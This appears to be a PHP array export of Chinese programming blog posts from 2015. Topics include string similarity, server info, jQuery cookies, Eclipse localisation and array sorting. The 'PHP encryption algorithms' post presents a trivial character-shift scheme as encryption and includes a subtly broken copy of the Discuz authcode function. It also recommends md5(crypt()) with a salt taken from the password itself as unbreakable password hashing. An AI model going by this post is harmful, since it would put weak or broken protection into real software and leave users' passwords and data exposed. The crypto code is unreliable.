&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;if&nbsp;($this-&gt;c[$i&nbsp;-&nbsp;1][$j]&nbsp;&gt;=&nbsp;$this-&gt;c[$i][$j&nbsp;-&nbsp;1])&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;c[$i][$j]&nbsp;=&nbsp;$this-&gt;c[$i&nbsp;-&nbsp;1][$j];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;c[$i][$j]&nbsp;=&nbsp;$this-&gt;c[$i][$j&nbsp;-&nbsp;1];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;printLCS($c,&nbsp;$i,&nbsp;$j)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($i&nbsp;==&nbsp;0&nbsp;||&nbsp;$j&nbsp;==&nbsp;0)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($this-&gt;str1[$i]&nbsp;==&nbsp;$this-&gt;str2[$j])&nbsp;return&nbsp;$this-&gt;str2[$j];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;return&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($this-&gt;str1[$i]&nbsp;==&nbsp;$this-&gt;str2[$j])&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;printLCS($this-&gt;c,&nbsp;$i&nbsp;-&nbsp;1,&nbsp;$j&nbsp;-&nbsp;1).$this-&gt;str2[$j];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;if&nbsp;($this-&gt;c[$i&nbsp;-&nbsp;1][$j]&nbsp;&gt;=&nbsp;$this-&gt;c[$i][$j&nbsp;-&nbsp;1])&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;printLCS($this-&gt;c,&nbsp;$i&nbsp;-&nbsp;1,&nbsp;$j);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;printLCS($this-&gt;c,&nbsp;$i,&nbsp;$j&nbsp;-&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}
}

$lcs&nbsp;=&nbsp;new&nbsp;LCS();
//返回最长公共子序列
$lcs-&gt;getLCS(&quot;hello&nbsp;word&quot;,&quot;hello&nbsp;china&quot;);
//返回相似度
echo&nbsp;$lcs-&gt;getSimilar(&quot;吉林禽业公司火灾已致112人遇难&quot;,&quot;吉林宝源丰禽业公司火灾已致112人遇难&quot;);
同样输出结果为：0.90322580645161，明显准确的多。</pre><p><br/></p><p><br/></p>',
            'keyword' => 'php,相似度,similar_text',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:03:43',
          ),
          48 => 
          array (
            'id' => '37',
            'uid' => '1',
            'title' => 'php获取服务器信息',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">&lt;?php
$sysos&nbsp;=&nbsp;$_SERVER[&quot;SERVER_SOFTWARE&quot;];&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//获取服务器标识的字串
$sysversion&nbsp;=&nbsp;PHP_VERSION;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//获取PHP服务器版本

//以下两条代码连接MySQL数据库并获取MySQL数据库版本信息
mysql_connect(&quot;localhost&quot;,&nbsp;&quot;mysql_user&quot;,&nbsp;&quot;mysql_pass&quot;);
$mysqlinfo&nbsp;=&nbsp;mysql_get_server_info();

//从服务器中获取GD库的信息
if(function_exists(&quot;gd_info&quot;))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$gd&nbsp;=&nbsp;gd_info();
&nbsp;&nbsp;&nbsp;&nbsp;$gdinfo&nbsp;=&nbsp;$gd[&#39;GD&nbsp;Version&#39;];
}&nbsp;else&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;$gdinfo&nbsp;=&nbsp;&quot;未知&quot;;
}

//从GD库中查看是否支持FreeType字体
$freetype&nbsp;=&nbsp;$gd[&quot;FreeType&nbsp;Support&quot;]&nbsp;?&nbsp;&quot;支持&quot;&nbsp;:&nbsp;&quot;不支持&quot;;
//从PHP配置文件中获得是否可以远程文件获取
$allowurl=&nbsp;ini_get(&quot;allow_url_fopen&quot;)&nbsp;?&nbsp;&quot;支持&quot;&nbsp;:&nbsp;&quot;不支持&quot;;
//从PHP配置文件中获得最大上传限制
$max_upload&nbsp;=&nbsp;ini_get(&quot;file_uploads&quot;)&nbsp;?&nbsp;ini_get(&quot;upload_max_filesize&quot;)&nbsp;:&nbsp;&quot;Disabled&quot;;
//从PHP配置文件中获得脚本的最大执行时间
$max_ex_time=&nbsp;ini_get(&quot;max_execution_time&quot;).&quot;秒&quot;;
//以下两条获取服务器时间，中国大陆采用的是东八区的时间,设置时区写成Etc/GMT-8
date_default_timezone_set(&quot;Etc/GMT-8&quot;);
$systemtime&nbsp;=&nbsp;date(&quot;Y-m-d&nbsp;H:i:s&quot;,time());
/*&nbsp;&nbsp;*******************************************************************&nbsp;&nbsp;*/
/*&nbsp;&nbsp;&nbsp;以HTML表格的形式将以上获取到的服务器信息输出给客户端浏览器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
/*&nbsp;&nbsp;*******************************************************************&nbsp;&nbsp;*/
echo&nbsp;&quot;&lt;table&nbsp;align=center&nbsp;cellspacing=0&nbsp;cellpadding=0&gt;&quot;;
echo&nbsp;&quot;&lt;caption&gt;&nbsp;&lt;h2&gt;&nbsp;系统信息&nbsp;&nbsp;&lt;/h2&gt;&nbsp;&lt;/caption&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;Web服务器：&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$sysos&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;PHP版本：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$sysversion&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;MySQL版本：&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$mysqlinfo&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;GD库版本：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$gdinfo&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;FreeType：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$freetype&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;远程文件获取：&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$allowurl&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;最大上传限制：&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$max_upload&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;最大执行时间：&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$max_ex_time&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;tr&gt;&nbsp;&lt;td&gt;&nbsp;服务器时间：&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;td&gt;&nbsp;$systemtime&nbsp;&nbsp;&nbsp;&lt;/td&gt;&nbsp;&lt;/tr&gt;&quot;;
echo&nbsp;&quot;&lt;/table&gt;&quot;;
?&gt;</pre><p><br/></p>',
            'keyword' => 'php,服务,信息',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:03:15',
          ),
          49 => 
          array (
            'id' => '36',
            'uid' => '1',
            'title' => '使用jquery设置与获取cookie',
            'content' => '<p>使用jquery获取和设置cookie需要引入jquery.cookie.js</p><pre class=\\"brush:html;toolbar:false\\">&lt;script&nbsp;src=&quot;Scripts/jquery-1.4.1.js&quot;&nbsp;type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script&nbsp;src=&quot;Scripts/jquery.cookie.js&quot;&nbsp;type=&quot;text/javascript&quot;&gt;&lt;/script&gt;
&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.cookie(&quot;mycookoe&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.cookie(&quot;mycookoe&quot;,&nbsp;&quot;1&quot;,{&nbsp;path:&#39;/&#39;,expires:365});&nbsp;//path参数为cookie保存文职；expires参数为cookie保存时间&nbsp;/天
&lt;/script&gt;</pre><p><br/></p>',
            'keyword' => 'jquery,cookie',
            'sortid' => '7',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:02:46',
          ),
          50 => 
          array (
            'id' => '35',
            'uid' => '1',
            'title' => 'PHP 一些加密算法',
            'content' => '<h3>一、可逆加密算法</h3><p>1、PHP加密</p><pre class=\\"brush:php;toolbar:false\\">&lt;?
&nbsp;
class&nbsp;encryptCalss&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;$key&nbsp;=&nbsp;12;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;encode($txt)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for($i=0;$i&lt;strlen($txt);$i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$txt[$i]&nbsp;=&nbsp;chr(ord($txt[$i])+$this-&gt;key);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$txt=urlencode(base64_encode(urlencode($txt)));
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;decode($txt)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$txt&nbsp;=&nbsp;urldecode(base64_decode($txt));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for($i=0;$i&lt;strlen($txt);$i++)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$txt[$i]&nbsp;=&nbsp;chr(ord($txt[$i])-$this-&gt;key);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$txt;
&nbsp;&nbsp;&nbsp;&nbsp;}
}
&nbsp;
?&gt;</pre><p>2、discuz加密解密</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
/**
&nbsp;*&nbsp;
&nbsp;*&nbsp;@param&nbsp;string&nbsp;$string&nbsp;原文或者密文
&nbsp;*&nbsp;@param&nbsp;string&nbsp;$operation&nbsp;操作(ENCODE&nbsp;|&nbsp;DECODE),&nbsp;默认为&nbsp;DECODE
&nbsp;*&nbsp;@param&nbsp;string&nbsp;$key&nbsp;密钥
&nbsp;*&nbsp;@param&nbsp;int&nbsp;$expiry&nbsp;密文有效期,&nbsp;加密时候有效，&nbsp;单位&nbsp;秒，0&nbsp;为永久有效
&nbsp;*&nbsp;@return&nbsp;string&nbsp;处理后的&nbsp;原文或者&nbsp;经过&nbsp;base64_encode&nbsp;处理后的密文
&nbsp;*&nbsp;@example&nbsp;
&nbsp;*&nbsp;&nbsp;&nbsp;$a&nbsp;=&nbsp;authcode(&#39;abc&#39;,&nbsp;&#39;ENCODE&#39;,&nbsp;&#39;key&#39;);
&nbsp;*&nbsp;&nbsp;&nbsp;$b&nbsp;=&nbsp;authcode($a,&nbsp;&#39;DECODE&#39;,&nbsp;&#39;key&#39;);&nbsp;&nbsp;//&nbsp;$b(abc)
&nbsp;*&nbsp;
&nbsp;*&nbsp;&nbsp;&nbsp;$a&nbsp;=&nbsp;authcode(&#39;abc&#39;,&nbsp;&#39;ENCODE&#39;,&nbsp;&#39;key&#39;,&nbsp;3600);
&nbsp;*&nbsp;&nbsp;&nbsp;$b&nbsp;=&nbsp;authcode(&#39;abc&#39;,&nbsp;&#39;DECODE&#39;,&nbsp;&#39;key&#39;);&nbsp;//&nbsp;在一个小时内，$b(abc)，否则&nbsp;$b&nbsp;为空
&nbsp;*/
function&nbsp;authcode($string,$operation=&#39;DECODE&#39;,$key=&#39;&#39;,$expiry=0){
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$ckey_length=4;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$key=md5($key&nbsp;?&nbsp;$key:&quot;kalvin.cn&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;$keya=md5(substr($key,0,16));
&nbsp;&nbsp;&nbsp;&nbsp;$keyb=md5(substr($key,16,16));
&nbsp;&nbsp;&nbsp;&nbsp;$keyc=$ckey_length&nbsp;?&nbsp;($operation==&#39;DECODE&#39;&nbsp;?&nbsp;substr($string,0,$ckey_length):substr(md5(microtime()),-$ckey_length)):&#39;&#39;;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$cryptkey=$keya.md5($keya.$keyc);
&nbsp;&nbsp;&nbsp;&nbsp;$key_length=strlen($cryptkey);
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$string=$operation==&#39;DECODE&#39;&nbsp;?&nbsp;base64_decode(substr($string,$ckey_length)):sprintf(&#39;0d&#39;,$expiry&nbsp;?&nbsp;$expiry+time():0).substr(md5($string.$keyb),0,16).$string;
&nbsp;&nbsp;&nbsp;&nbsp;$string_length=strlen($string);
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$result=&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;$box=range(0,255);
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$rndkey=array();
&nbsp;&nbsp;&nbsp;&nbsp;for($i=0;$i&lt;=255;$i++){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rndkey[$i]=ord($cryptkey[$i%$key_length]);
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for($j=$i=0;$i&lt;256;$i++){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$j=($j+$box[$i]+$rndkey[$i])%256;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp=$box[$i];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$i]=$box[$j];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$j]=$tmp;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for($a=$j=$i=0;$i&lt;$string_length;$i++){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$a=($a+1)%256;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$j=($j+$box[$a])%256;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tmp=$box[$a];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$a]=$box[$j];
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$box[$j]=$tmp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$result.=chr(ord($string[$i])&nbsp;^&nbsp;($box[($box[$a]+$box[$j])%256]));
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if($operation==&#39;DECODE&#39;){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((substr($result,0,10)==0||substr($result,0,10)-time()&gt;0)&amp;&amp;substr($result,10,16)==substr(md5(substr($result,26).$keyb),0,16)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;returnsubstr($result,26);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&#39;&#39;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return$keyc.str_replace(&#39;=&#39;,&#39;&#39;,base64_encode($result));
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;
}
?&gt;</pre><p><br/></p><p><strong>二、不可逆加密方法（无意间在网上看的）</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不容易发现现在基本都是用md5加密算法，都说 MD5 不可逆 无法破 ，对 MD5是无法逆 可是可以暴力破解；<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只需要把常用的密码 MD5后 放数据库里 ，别人只需要提供MD5密码 进行数据库对比 就可以还原密码了 。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;国内www.cmd5.com国外www.xmd5.org ，都提供在线爆破 ，很多站长被人入侵过吧？其中最大部分是管理员密码被SQL注入 导致泄露然后进后台搞破坏。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PHP的内置函数crypt 很不错 配合MD5 更天下无敌。</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
$pass&nbsp;=&nbsp;&#39;123456&#39;;
echo&nbsp;&quot;MD5加密后&quot;.md5($pass).&quot;&lt;br&gt;&quot;;&nbsp;//不安全
echo&nbsp;&quot;crypt加密后&quot;.crypt($pass).&quot;&lt;br&gt;&quot;;&nbsp;//&nbsp;比较乱的密码&nbsp;刷新后还会变
echo&nbsp;&quot;crypt复杂加密后&quot;.crypt($pass,substr($pass,0,2)).&quot;&lt;br&gt;&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//还是不爽
echo&nbsp;&quot;无敌加密后&quot;.md5(crypt($pass,substr($pass,0,2))).&quot;&lt;br&gt;&quot;;&nbsp;&nbsp;&nbsp;//&nbsp;现在让黑客如何破这个密码？？？
?&gt;</pre><p><br/></p>',
            'keyword' => 'php,加密,算法',
            'sortid' => '6',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:01:06',
          ),
          51 => 
          array (
            'id' => '34',
            'uid' => '1',
            'title' => 'Eclipse汉化方法',
            'content' => '<p>我们根据下面的链接，在浏览器中打开页面，页面显示如下：</p><p>http://www.eclipse.org/babel/downloads.php</p><p><img src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101357340515126.png\\" alt=\\"\\" data-mce-src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101357340515126.png\\"/></p><p><img src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101358510666098.png\\" alt=\\"\\" data-mce-src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101358510666098.png\\"/></p><p>上图列出的有三个版本的（如果下载的是最新版本的Eclipse，就可以点击第一个“Luna”），其他版本的就选择其他版本，我在这里以“Kepler”版本为例来讲解。我们点击“Kepler”后，页面显示如下：</p><p><img src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101400027076745.png\\" alt=\\"\\" data-mce-src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101400027076745.png\\"/><img src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101400128015294.png\\" alt=\\"\\" data-mce-src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101400128015294.png\\"/></p><p>在该页面中有许多种语言的版本，我只要找到Chinese即可（它是按照英文首字母排的，Chinese就在前面），我们找到之后就点击它的链接，即可进行汉化包的下载。</p><p>下载完成后我们复制该文件夹里面的两个文件，界面显示如下：</p><p><img src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101401128797706.png\\" alt=\\"\\" data-mce-src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101401128797706.png\\"/></p><p>注意我在图中标出的文件的路径，要复制的两个文件是在下载的文件的eclipse文件夹下的，然后我们将这两个文件粘贴到我们的Eclipse的文件夹下，具体如下图：</p><p><img src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101402186767871.png\\" alt=\\"\\" data-mce-src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101402186767871.png\\"/></p><p>请参照我在上图中标出的文件路径，来找出自己电脑上的文件所在路径。然后粘贴刚才复制的两个文件。</p><p>上述步骤完成之后，我们再打开Eclipse软件，就会发现我们的Eclipse变成中文版的了。</p><p>转载：http://jingyan.baidu.com/article/4dc408489affb6c8d946f190.html</p><p><br/></p>',
            'keyword' => 'Eclipse',
            'sortid' => '3',
            'img' => '',
            'views' => '1',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 16:00:33',
          ),
          52 => 
          array (
            'id' => '33',
            'uid' => '1',
            'title' => 'PHP 二维数组根据某个字段排序',
            'content' => '<p><strong><span style=\\"background-color: #ffff00;\\">要求：从两个不同的表中获取各自的4条数据，然后整合(array_merge)成一个数组，再根据数据的创建时间降序排序取前4条。</span></strong></p><p><span style=\\"white-space: pre;\\">遇到这个要求的时候就不是 ORDER BY 能解决的问题了。因此翻看 PHP 手册查找到了如下方法，做此笔记。</span></p><p><span style=\\"white-space: pre;\\">废话少说，奉上代码，清单如下：</span></p><pre class=\\"brush:php;toolbar:false\\">&lt;?php&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;/**&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;二维数组根据某个字段排序&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;功能：按照用户的年龄倒序排序&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@author&nbsp;ruxing.li&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;header(&#39;Content-Type:text/html;Charset=utf-8&#39;);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$arrUsers&nbsp;=&nbsp;array(&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;1,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;&#39;张三&#39;,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;&nbsp;=&gt;&nbsp;25,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;2,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;name&#39;&nbsp;=&gt;&nbsp;&#39;李四&#39;,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;age&#39;&nbsp;&nbsp;=&gt;&nbsp;23,&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;array(&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;id&#39;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;3,&nbsp;&nbsp;
